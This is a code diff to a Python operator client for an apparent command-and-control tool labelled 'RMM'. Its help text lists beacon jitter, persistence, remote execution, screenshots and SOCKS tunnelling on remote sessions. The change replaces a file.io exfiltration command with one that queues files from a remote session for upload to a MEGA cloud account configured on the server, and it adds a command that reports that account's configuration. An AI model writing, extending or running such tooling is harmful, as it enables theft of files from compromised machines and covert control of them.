@@ -55,7 +55,8 @@ RMM_CLI_COMMANDS = [
     "set_jitter",
     "show_config",
     "download",
-    "fileio",
+    "mega",
+    "mega-config",
     "upload",
     "screenshot",
     "socks",
@@ -189,15 +190,15 @@ class RmmApiClient:
             {"remote_path": remote_path},
         )
 
-    def queue_fileio(self, session_id: str, remote_path: str, expires: str | None = None):
-        body = {"remote_path": remote_path}
-        if expires:
-            body["expires"] = expires
+    def queue_mega(self, session_id: str, remote_path: str):
         return self.request(
             "POST",
-            f"/api/v1/sessions/{session_id}/fileio",
-            body,
+            f"/api/v1/sessions/{session_id}/mega",
+            {"remote_path": remote_path},
         )
+
+    def get_mega_config(self):
+        return self.request("GET", "/api/v1/mega/config")
 
     def queue_screenshot(self, session_id: str):
         return self.request(
@@ -566,12 +567,31 @@ def cmd_download(client: RmmApiClient, state: dict, args):
     print("Download queued — check server RMM_logs/downloads/ or poll events")
 
 
-def cmd_fileio(client: RmmApiClient, state: dict, args):
+def cmd_mega(client: RmmApiClient, state: dict, args):
     sid = require_session(state, args.session)
-    code, data = client.queue_fileio(sid, args.remote_path, expires=args.expires)
+    code, data = client.queue_mega(sid, args.remote_path)
     if code != 200:
-        die(f"file.io queue failed ({code}): {data}")
-    print("file.io upload queued — poll events for https://file.io/… link")
+        die(f"MEGA queue failed ({code}): {data}")
+    mega = data.get("mega") if isinstance(data, dict) else None
+    if mega and mega.get("email"):
+        print(f"MEGA account: {mega.get('email')}  folder: {mega.get('folder') or '/'}")
+    print("MEGA upload queued — poll events for https://mega.nz/… link")
+
+
+def cmd_mega_config(client: RmmApiClient, state: dict, args):
+    code, data = client.get_mega_config()
+    if code != 200:
+        die(f"mega config failed ({code}): {data}")
+    if getattr(args, "json", False):
+        print(json.dumps(data, indent=2))
+        return
+    if not data.get("configured"):
+        print("MEGA not configured — set RMM_MEGA_EMAIL and RMM_MEGA_PASSWORD on the server")
+    else:
+        print(f"MEGA configured: {data.get('email') or '(email set)'}")
+        print(f"  folder: {data.get('folder') or '/'}")
+        print(f"  max_bytes: {data.get('max_bytes')}")
+        print(f"  library: {'mega.py-v2 installed' if data.get('library_available') else 'mega.py-v2 missing'}")
 
 
 def cmd_upload(client: RmmApiClient, state: dict, args):
@@ -672,7 +692,8 @@ def _show_help():
 Session:  list | use <id> | info | background | kill [id]
 Beacon:   set_sleep <seconds> | set_jitter <percent> | show_config
 Remote:   <command>  (queue) | exec <command>  (wait) | persist <cmd> | stop
-Files:    download <remote> | fileio <remote> [expires] | upload <local> <remote> | screenshot
+Files:    download <remote> | mega <remote> | upload <local> <remote> | screenshot
+Config:   mega-config   (MEGA account status on server)
 Tunnel:   socks list | socks [port] | socks stop   (SOCKS5 on 127.0.0.1, default 1080)
 Other:    events [since] | health | help | quit
 
@@ -1053,25 +1074,35 @@ def run_interactive(
                 else:
                     warn(f"failed ({code})")
                 continue
-            if cmd == "fileio":
+            if cmd == "mega":
                 if not rest:
-                    warn("Usage: fileio <remote_path> [expires]")
+                    warn("Usage: mega <remote_path>")
                     continue
                 sid = session_or_none(state)
                 if not sid:
                     warn("No session selected")
                     continue
-                expires = None
-                if len(rest) >= 2:
-                    expires = rest[-1]
-                    remote = " ".join(rest[:-1])
-                else:
-                    remote = " ".join(rest)
-                code, _ = client.queue_fileio(sid, remote, expires=expires)
+                remote = " ".join(rest)
+                code, data = client.queue_mega(sid, remote)
                 if code == 200:
-                    say("file.io upload queued")
+                    say("MEGA upload queued")
+                elif code == 503 and isinstance(data, dict) and data.get("error"):
+                    warn(str(data["error"]))
                 else:
                     warn(f"failed ({code})")
+                continue
+            if cmd == "mega-config":
+                code, data = client.get_mega_config()
+                if code != 200:
+                    warn(f"failed ({code})")
+                elif isinstance(data, dict):
+                    if data.get("configured"):
+                        say(
+                            f"MEGA {data.get('email')}  folder={data.get('folder') or '/'}  "
+                            f"max={data.get('max_bytes')}  lib={'ok' if data.get('library_available') else 'missing'}"
+                        )
+                    else:
+                        warn("MEGA not configured on server (RMM_MEGA_EMAIL / RMM_MEGA_PASSWORD)")
                 continue
             if cmd == "upload":
                 if len(rest) < 2:
@@ -1340,11 +1371,14 @@ def build_parser() -> argparse.ArgumentParser:
     sp_dl.add_argument("--session", "-s", default=None)
     sp_dl.set_defaults(func=cmd_download)
 
-    sp_fio = sub.add_parser("fileio", help="Queue remote file upload to file.io")
-    sp_fio.add_argument("remote_path")
-    sp_fio.add_argument("--expires", default=None, help="file.io expiry (e.g. 14d, 1w, 1m)")
-    sp_fio.add_argument("--session", "-s", default=None)
-    sp_fio.set_defaults(func=cmd_fileio)
+    sp_mega = sub.add_parser("mega", help="Queue remote file upload to MEGA (server account)")
+    sp_mega.add_argument("remote_path")
+    sp_mega.add_argument("--session", "-s", default=None)
+    sp_mega.set_defaults(func=cmd_mega)
+
+    sp_mcfg = sub.add_parser("mega-config", help="Show MEGA account configuration on server")
+    sp_mcfg.add_argument("--json", action="store_true", help="JSON output")
+    sp_mcfg.set_defaults(func=cmd_mega_config)
 
     sp_ul = sub.add_parser("upload", help="Upload local file to remote path")
     sp_ul.add_argument("local")
